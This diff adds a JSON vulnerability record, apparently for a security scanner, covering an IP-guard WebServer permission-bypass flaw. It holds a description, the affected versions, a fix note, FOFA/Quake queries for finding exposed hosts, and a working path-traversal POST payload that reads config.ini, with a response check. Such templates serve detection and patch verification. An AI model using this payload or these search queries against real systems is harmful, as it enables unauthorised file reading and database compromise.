@@ -1,0 +1,39 @@
+{
+  "product": "IP-guard",
+  "vul_name": "IP-guard WebServer 权限绕过",
+  "type": "访问控制",
+  "vul_id": [
+    "QVD-2024-14103"
+  ],
+  "level": 3,
+  "vul_desc": "2024年4月，互联网上披露IP-guard WebServer权限绕过漏洞情报，攻击者可利用该漏洞读取配置文件，获取数据库权限。该漏洞利用简单，建议受影响的客户尽快修复漏洞。该漏洞的成功利用允许攻击者规避安全验证，通过后端接口执行文件的任意读取和删除操作。利用这一漏洞，攻击者有可能获取数据库的配置详情，并控制整个数据库系统。",
+  "version": "IP-guard < 4.82.0609.0",
+  "note": "",
+  "search": {
+    "Quake": "app:\"IPguard-System\"",
+    "FOFA": "icon_hash=\"2030860561\""
+  },
+  "protocol": "http",
+  "link": "https://blog.csdn.net/weixin_43689708/article/details/137955909",
+  "fix": [
+    "官方已发布新版本修复漏洞，建议尽快访问官网（https://www.ip-guard.net/）或联系官方售后支持获取版本升级安装包或补丁，升级至4.82.0609.0版本及以上。"
+  ],
+  "exploit": {
+    "exp": {
+      "method": "post",
+      "follow": false,
+      "path": "/ipg/appr/MApplyList/downloadFile_client/getdatarecord",
+      "data": "path=..%2Fconfig.ini&filename=1&action=download&hidGuid=1v%0D%0A\n\n"
+    },
+    "verify": {
+      "path": "",
+      "logic": "and",
+      "check": [
+        {
+          "status": 200,
+          "body": "[viewcfg]"
+        }
+      ]
+    }
+  }
+}
